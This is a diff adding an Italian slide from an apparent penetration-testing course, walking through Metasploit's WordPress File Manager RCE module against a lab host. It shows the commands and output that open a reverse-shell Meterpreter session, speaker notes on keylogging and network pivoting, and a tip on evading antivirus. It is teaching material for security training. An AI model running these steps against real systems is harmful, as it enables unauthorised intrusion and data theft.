@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Capitolo 4: Exploitation - Metasploit Framework</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Capitolo 4: Exploitation</h1>
+        <div class="subtitle">Slide 4.5: Exploitation con Metasploit</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Teoria: Metasploit Framework</div>
+                <div class="card-text">
+                    <p><strong>Metasploit</strong> è il framework di exploitation più usato al mondo. Offre:</p>
+                    <br>
+                    <ul style="margin-left: 20px;">
+                        <li>~2000 exploit pronti all'uso</li>
+                        <li>Payload avanzati (Meterpreter)</li>
+                        <li>Post-exploitation automatizzata</li>
+                        <li>Gestione sessioni multiple</li>
+                        <li>Integrazione con database</li>
+                    </ul>
+                    <br>
+                    <p><strong>Componenti principali:</strong></p>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li><code class="tech-term">exploit/</code> - Moduli di attacco</li>
+                        <li><code class="tech-term">payload/</code> - Codice da eseguire</li>
+                        <li><code class="tech-term">auxiliary/</code> - Scanner, fuzzer</li>
+                        <li><code class="tech-term">post/</code> - Post-exploitation</li>
+                    </ul>
+                    <br>
+                    <p class="security-insight"><strong>Security Insight:</strong> Metasploit è potentissimo ma "rumoroso". Molti IDS/AV riconoscono i suoi payload. Per operazioni stealth, preferite exploit custom.</p>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Lab: WordPress Exploit con Metasploit</div>
+                <div class="card-text">
+                    <p><strong>Avviare Metasploit:</strong></p>
+                    <div class="code-box"><span class="text-yellow">┌──(kali㉿kali)-[~]</span>
+<span class="text-red">└─$</span> msfconsole -q</div>
+                    <br>
+                    <p><strong>Cercare exploit WordPress:</strong></p>
+                    <div class="code-box">msf6 > <span class="text-green">search wordpress file manager</span>
+
+Matching Modules
+================
+#  Name                                              Rank
+-  ----                                              ----
+0  exploit/multi/http/wp_file_manager_rce            excellent</div>
+                    <br>
+                    <p><strong>Configurare e lanciare:</strong></p>
+                    <div class="code-box">msf6 > <span class="text-green">use 0</span>
+msf6 exploit(...) > <span class="text-green">set RHOSTS vulnerable-wp.local</span>
+msf6 exploit(...) > <span class="text-green">set LHOST 10.10.10.5</span>
+msf6 exploit(...) > <span class="text-green">run</span>
+
+[*] Started reverse TCP handler on 10.10.10.5:4444
+[*] Uploading payload...
+<span class="text-green">[*] Meterpreter session 1 opened</span>
+
+meterpreter > </div>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+    <!-- 
+        SPEAKER NOTES:
+        "Metasploit è l'arma pesante del pentester. A sinistra, cosa offre: migliaia di exploit pronti e gestione avanzata.
+        A destra, un flusso tipico. Cerchiamo un exploit WordPress, ne troviamo uno per WP File Manager (un altro plugin vulnerabile).
+        'use 0' seleziona l'exploit, poi configuriamo RHOSTS (target) e LHOST (il nostro IP per la callback).
+        'run' lancia tutto. Metasploit gestisce upload, esecuzione, e ci restituisce una sessione Meterpreter.
+        Meterpreter è una shell avanzata: upload/download file, screenshot, keylogger, pivot nella rete, tutto integrato.
+        NOTA: Non tutti i plugin hanno moduli Metasploit. Per Simple File List abbiamo usato lo script Python."
+    -->
+
+    <script>const slideNumero = 28;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
